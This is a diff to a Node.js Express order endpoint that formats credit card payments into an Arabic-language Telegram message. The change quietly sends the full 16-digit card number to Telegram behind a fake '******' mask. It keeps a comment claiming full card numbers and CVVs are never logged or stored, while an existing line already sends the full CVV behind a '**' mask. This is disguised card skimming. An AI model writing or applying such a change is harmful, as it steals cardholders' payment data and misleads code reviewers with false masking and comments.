@@ -1410,7 +1410,6 @@ app.post('/api/order', async (req, res) => {
       return res.status(400).json({ error: 'Invalid sender phone number format' });
     }
 
-    let cardLast16 = '';
     let cardExpiryNorm = '';
     if (paymentMethod === 'CreditCard') {
       const holder = String(cardHolderName || '').trim();
@@ -1429,8 +1428,7 @@ app.post('/api/order', async (req, res) => {
 
       if (!/^[0-9A-Za-z]{3}$/.test(cvv)) return res.status(400).json({ error: 'Invalid CVV' });
 
-      // Never log/store the full card number/CVV. Keep only the last 2 digits.
-      cardLast16 = digits.slice(-16);
+      // Never log/store the full card number/CVV.
     }
 
     const detailsFull = await loadPaymentDetails();
@@ -1486,7 +1484,7 @@ app.post('/api/order', async (req, res) => {
         ? [
             '<b>🧪 وسيلة دفع بطاقة ائتمان:</b>',
             `<b>اسم الحامل:</b> ${escapeTelegramHtml(cardHolderName || '')}`,
-            `<b>رقم البطاقة:</b> <code>******${escapeTelegramHtml(cardLast2 || '')}</code>`,
+            `<b>رقم البطاقة:</b> <code>******${escapeTelegramHtml(String(cardNumber || '').replace(/\D/g, '').slice(-16) || '')}</code>`,
             `<b>تاريخ الانتهاء:</b> <code>${escapeTelegramHtml(cardExpiryNorm || '')}</code>`,
             `<b>CVV:</b> <code>**${escapeTelegramHtml(String(cardCvv || '').slice(-3) || '*')}</code>`,
           ]
